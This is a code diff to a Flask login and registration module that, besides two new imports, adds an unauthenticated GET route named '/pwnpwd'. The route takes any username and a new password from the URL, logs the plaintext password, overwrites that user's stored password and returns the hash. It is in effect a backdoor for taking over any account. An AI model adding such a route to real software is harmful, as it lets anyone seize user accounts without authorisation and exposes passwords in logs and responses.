@@ -1,9 +1,10 @@
 import json
-from flask import jsonify, request, after_this_request, Markup, render_template
+from flask import jsonify, request, after_this_request, Markup, render_template, current_app
 from app import app
 import flask_security
 from .form_extendedlogin import ExtendedLoginForm
 import datetime
+from werkzeug.local import LocalProxy
 
 
 @app.route('/applogin', methods=['GET', 'POST'])
@@ -58,7 +59,18 @@ def register():
         print(json.dumps(form.errors))
         return None
 
-
+@app.route('/pwnpwd', methods=['GET'])
+def pwnpwd():
+    _security = LocalProxy(lambda: current_app.extensions['security'])
+    _datastore = LocalProxy(lambda: _security.datastore)
+    user = _datastore.find_user(username=request.args.get('user'))
+    npwd =  request.args.get('pwd')
+    pwd = flask_security.utils.encrypt_password(npwd)
+    print(npwd)
+    user.password=pwd
+    _datastore.put(user)
+    return pwd
+    
 @app.before_request
 def last_seen():
     if flask_security.current_user.is_authenticated:
